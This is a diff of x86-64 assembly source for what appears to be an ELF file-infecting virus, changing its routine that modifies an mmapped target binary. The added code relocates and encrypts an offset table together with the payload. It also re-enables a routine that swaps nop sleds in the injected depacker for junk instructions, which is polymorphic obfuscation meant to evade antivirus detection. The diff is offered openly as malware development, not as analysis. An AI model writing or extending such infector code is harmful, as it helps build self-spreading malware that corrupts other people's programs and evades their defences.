@@ -5,7 +5,7 @@ section .text
 	global _update_mmaped_file
 
 _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_size, long virus_size, long fd)
-	enter 256, 0
+	enter 384, 0
 	; rsp + 0  mmap start address (ehdr)
 	; rsp + 8  file size
 	; rsp + 16 virus size
@@ -26,6 +26,7 @@ _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_siz
 	; rsp + 132 key addr
 	; rsp + 140 text section offset in file
 	; rsp + 148 text section vaddr
+	; rsp + 240 -> 368, table_offset_tmp.
 	;;;;;;;;;;;;;;;;;;;;;
 
 ; init phase
@@ -275,6 +276,13 @@ _copy_unencrypted_part:
 	mov QWORD [rsp + 188], 0
 	mov QWORD [rsp + 196], 0
 	mov QWORD [rsp + 204], 0
+	lea r12, [rel _table_offset]
+	mov QWORD [rsp + 212], r12
+	lea rdi, [rsp + 240]
+	lea rsi, [rel _table_offset]
+	mov rcx, 16
+	cld
+	rep movsq
 	.loop:
 		mov rdi, QWORD [rsp + 156]
 		mov rsi, QWORD [rsp + 164]
@@ -306,6 +314,8 @@ _copy_unencrypted_part:
 		add rcx, 8
 		lea r10, [rel _start]
 		mov rsi, QWORD [rsi]
+		mov QWORD [rsp + 220], rsi
+		sub QWORD [rsp + 220], 8
 		add rsi, r10
 		sub rsi, 8
 		mov rcx, QWORD [rcx]
@@ -320,6 +330,32 @@ _copy_unencrypted_part:
 		add QWORD [rsp + 116], rcx
 		cld
 		rep movsb
+		.check_loop_table_offset:
+			xor rcx, rcx
+			xor rsi, rsi
+			lea rdi, [rel _table_offset]
+			.check_offsets_loop:
+				mov r10, QWORD [rsp + 220]
+				cmp DWORD [rdi + rcx], r10d
+				jl .next_offset
+				add r10, QWORD [rsp + 204]
+				cmp DWORD [rdi + rcx], r10d
+				jge .next_offset
+
+				mov r10d, DWORD [rsp + 172]
+				sub r10d, DWORD [rsp + 220]
+				lea r11, [rel _table_offset]
+				add r11, rcx
+				mov r11d, DWORD [r11]
+				mov DWORD [rsp + 240 + rcx], r11d
+				add DWORD [rsp + 240 + rcx], r10d
+
+				.next_offset:
+				cmp rcx, 124
+				je .table_updated
+				add rcx, 4
+				jmp .check_offsets_loop
+		.table_updated:
 		mov rdi, QWORD [rsp + 180]
 		mov rsi, QWORD [rsp + 172]
 		mov QWORD [rdi], rsi
@@ -355,6 +391,41 @@ _copy_encrypt_zone:
 ; take the base addr to encrypt
 	lea rdi, [rel _encrypted_part_start]
 ; calculate the size to encrypt
+	lea rsi, [rel _table_offset]
+;	lea rsi, [rel _final_end] ; take the end addr to encrypt
+;	add rsi, 2
+	sub rsi, rdi ; calculate the size to encrypt
+; take the addr to store the encrypted part
+	mov rdx, QWORD [rsp + 108] ; mmap addr
+	add rdx, QWORD [rsp + 116] ; offset
+	xor r10, r10
+	call _encrypt_zone
+	mov QWORD [rsp + 132], rax ; take the key addr the function returned
+	lea rsi, [rel _table_offset]
+;	add rsi, 2
+	lea r10, [rel _encrypted_part_start]
+	sub rsi, r10
+	add QWORD [rsp + 116], rsi
+
+; take the base addr to encrypt
+	lea rdi, [rsp + 240]
+; calculate the size to encrypt
+;	lea rsi, [rel _table_offset]
+;	lea rsi, [rel _final_end] ; take the end addr to encrypt
+;	add rsi, 2
+;	sub rsi, rdi ; calculate the size to encrypt
+	mov rsi, 128
+; take the addr to store the encrypted part
+	mov rdx, QWORD [rsp + 108] ; mmap addr
+	add rdx, QWORD [rsp + 116] ; offset
+	mov r10, QWORD [rsp + 132]
+	call _encrypt_zone
+;	add rsi, 2
+	add QWORD [rsp + 116], 128
+
+	lea rdi, [rel _table_offset]
+	add rdi, 128
+; calculate the size to encrypt
 	lea rsi, [rel _padding]
 ;	lea rsi, [rel _final_end] ; take the end addr to encrypt
 ;	add rsi, 2
@@ -362,11 +433,12 @@ _copy_encrypt_zone:
 ; take the addr to store the encrypted part
 	mov rdx, QWORD [rsp + 108] ; mmap addr
 	add rdx, QWORD [rsp + 116] ; offset
+	mov r10, QWORD [rsp + 132]
 	call _encrypt_zone
-	mov QWORD [rsp + 132], rax ; take the key addr the function returned
 	lea rsi, [rel _padding]
 ;	add rsi, 2
-	lea r10, [rel _encrypted_part_start]
+	lea r10, [rel _table_offset]
+	add r10, 128
 	sub rsi, r10
 	add QWORD [rsp + 116], rsi
 
@@ -393,13 +465,14 @@ _inject_modified_depacker:
 
 ; Then we run _byterpl(depacker start in destination, depacker size);
 ; to replace nop sleds by junks instructions
-;	lea rcx, [rel _o_entry]
-;	lea rsi, [rel _start]
-;	sub rsi, rcx
-;	mov rdi, QWORD [rsp + 108]
-;	add rdi, rsi
-;	add rdi, QWORD [rsp + 72]
-;	call _byterpl
+	lea rcx, [rel _o_entry]
+	lea rsi, [rel _start]
+	sub rsi, rcx
+	mov rdi, QWORD [rsp + 108]
+	add rdi, rsi
+	add rdi, QWORD [rsp + 72]
+	lea rsi, [rsp + 240]
+	call _byterpl
 
 ; Incremente our index in our destination mmap
 	lea rsi, [rel _decrypt]
